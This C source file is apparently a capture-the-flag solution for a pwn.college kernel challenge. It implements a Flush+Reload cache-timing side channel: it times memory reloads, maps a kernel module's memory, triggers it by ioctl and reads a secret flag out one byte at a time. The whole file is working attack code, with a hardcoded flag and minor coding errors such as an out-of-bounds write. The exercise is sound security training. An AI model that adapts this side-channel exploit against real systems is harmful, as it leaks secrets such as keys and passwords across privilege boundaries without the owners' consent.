#define _GNU_SOURCE

#include <sys/mman.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/signal.h>
#include <stdlib.h>
#include <inttypes.h>
#include <sched.h>
#include <sys/prctl.h>
#include <fcntl.h>

#include <x86intrin.h>

#define PAGESIZE 0x1000

static size_t threshold = 0;
int leaked_chars = 0;
char* mem;

int flush_reload_t(void *ptr) {
  uint64_t start, end, junk;
  uint32_t tsc;

  start = __rdtscp(&tsc);
  _mm_lfence();
  junk = *(volatile uint64_t *)ptr;
  _mm_lfence();
  end = __rdtscp(&tsc);
  _mm_mfence();
  _mm_clflush(ptr);

  return (int)(end - start);
}

int flush_reload(void *ptr) {
  return flush_reload_t(ptr) < threshold;
}

int reload_t(void *ptr) {
  uint64_t start, end, junk;
  uint32_t tsc;

  start = __rdtscp(&tsc);
  _mm_lfence();
  junk = *(volatile uint64_t *)ptr;
  _mm_lfence();
  end = __rdtscp(&tsc);
  _mm_mfence();

  return (int)(end - start);
}

void flush_channel() {
  for(int i = 0; i < 256; i++) {
    _mm_clflush(mem + i * PAGESIZE);
  }
}

void get_leaks(char *leaked, int index) {
  for(int i = 0; i < 256; i++) {
    int mix_i = ((i * 167) + 13) & 255; // prevent stride prefetcher from screwing with our results
    if(flush_reload(mem + mix_i * PAGESIZE)) {
      if((mix_i >= '.' && mix_i <= '}') && leaked[index] == ' ') {
        leaked[index] = mix_i;
        leaked_chars++;
        printf("leaked: %s\n", leaked);
      }
    }
  }
}

size_t detect_flush_reload_threshold() {
  size_t reload_time = 0, flush_reload_time = 0, i, count = 1000000;
  size_t ptr[16];

  reload_t(ptr);

  for (i = 0; i < count; i++) {
    reload_time += reload_t(ptr);
  }
  for (i = 0; i < count; i++) {
    flush_reload_time += flush_reload_t(ptr);
  }
  reload_time /= count;
  flush_reload_time /= count;

  return (flush_reload_time + reload_time * 2) / 3;
}

void pin_cpu(int cpu) {
    cpu_set_t my_set;
    CPU_ZERO(&my_set);
    CPU_SET(cpu, &my_set);
    sched_setaffinity(0, sizeof(my_set), &my_set);
}

int main(void)
{
	pin_cpu(1);

	char *pseudo_flag = "pwn.college{YAR63rFoR9Z35QESaOTdK39VYf_.QXxMDNsYjN0EzW}";
	//char *pseudo_flag = "pwn.college{practice}";

	int flag_len = strlen(pseudo_flag);

	threshold = detect_flush_reload_threshold();
	threshold = 242;
	printf("threshold: %ld\n", threshold);

	// open and mmap kernel module
	int fd = open("/proc/pwncollege", O_RDWR);
	printf("kmod fd: %d\n", fd);

	mem = mmap(0, 256*0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_POPULATE, fd, 0);
	mem[1] = 254;

    // setup results buffer
    char leaked[flag_len];
    memset(leaked, ' ', sizeof(leaked));
    leaked[flag_len] = 0;

	int i = -1;
	while (leaked_chars < flag_len) {
		i = (i + 1) % flag_len;
		if (leaked[i] == ' ') {
            flush_channel();
			for (int j = 0; j < 0x10; j++) {
				mem[0] = i;
				ioctl(fd, 1337);
			}
			get_leaks(leaked, i);
		}
	}

    if (strcmp(leaked+10, pseudo_flag+10) == 0) {
        printf("success!\n");
    } else {
        printf("rip\n");
    }

	close(fd);
	return 0;
}
